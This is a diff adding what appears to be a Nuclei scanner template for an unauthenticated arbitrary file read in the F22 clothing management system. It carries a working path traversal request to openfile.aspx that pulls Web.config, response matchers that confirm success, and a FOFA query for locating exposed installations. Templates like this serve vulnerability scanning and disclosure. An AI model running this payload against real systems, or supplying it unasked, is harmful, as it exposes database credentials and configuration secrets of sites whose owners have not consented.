@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <configuration>
+            - </configuration>
+            - machine.config.comments
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /oa/isprit/module/openfile.aspx?Url=..\..\..\Web.config HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+id: F22-openfile_aspx-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: body="b28web/Utility/"
+        F22服装管理软件系统 openfile.aspx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: F22服装管理软件系统 openfile.aspx 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488913&idx=1&sn=394075d44d6b47092d914c4fffb0362a&chksm=c267a0a2f51029b489aa8073f6f767636f8bd310501c40fee1daedcfc89f84db777c597d9c3f&token=385896921&lang=zh_CN&poc_token=HLMgLGejBhVFR9nCHz6xvWJK_2yCczTJG9wGPpk5
+    severity: high
+    tags:
+        - File reading
